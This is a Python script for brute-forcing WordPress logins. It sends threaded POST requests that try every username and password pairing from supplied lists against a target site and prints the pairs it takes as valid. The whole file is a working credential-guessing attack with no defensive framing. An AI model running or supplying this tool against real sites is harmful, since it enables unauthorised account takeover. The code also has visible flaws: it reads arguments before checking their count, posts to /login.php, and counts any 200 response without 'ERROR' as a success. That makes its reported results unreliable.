from concurrent.futures import ThreadPoolExecutor
import requests
import sys

def login_request(user, password, url):
    login_url = f"{url}/login.php"
    data = {
        'log': user,
        'pwd': password,
        'wp-submit': 'Log+In',
        'redirect_to': f'http%3A%2F%2F{url}%2Fwp-admin%2F',
        'testcookie': '1'
    }

    response = requests.post(login_url, data=data)

    if response.status_code == 200 and "ERROR" not in response.text:
        print(f"User: {user}; Password: {password}")


if __name__=='__main__':

    users_list = sys.argv[1]
    passwd_list = sys.argv[2]
    url_to_bruteforce = sys.argv[3]

    if len(sys.argv) != 4:
        print("Usage: python3 wp_login_bruteforce.py <users_list.txt> <passwd_list.txt> <url>")
        sys.exit()

    if users_list.endswith('.txt'):
        with open(users_list, 'r') as ul:
            users = ul.read().splitlines()
    else:
        users = [users_list]

    if passwd_list.endswith('.txt'):
        with open(passwd_list, 'r') as pl:
            passwords = pl.read().splitlines()
    else:
        passwords = [passwd_list]

    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for user in users:
            for password in passwords:
                futures.append(executor.submit(login_request, user, password, url_to_bruteforce))

        for future in futures:
            try:
                future.result()

            except KeyboardInterrupt:
                print("Keyboard Interrupt")
                sys.exit()

            except requests.exceptions.ConnectionError:
                print("Connection Error")
                sys.exit()

            except requests.exceptions.Timeout:
                print("Timeout Error")
                sys.exit()
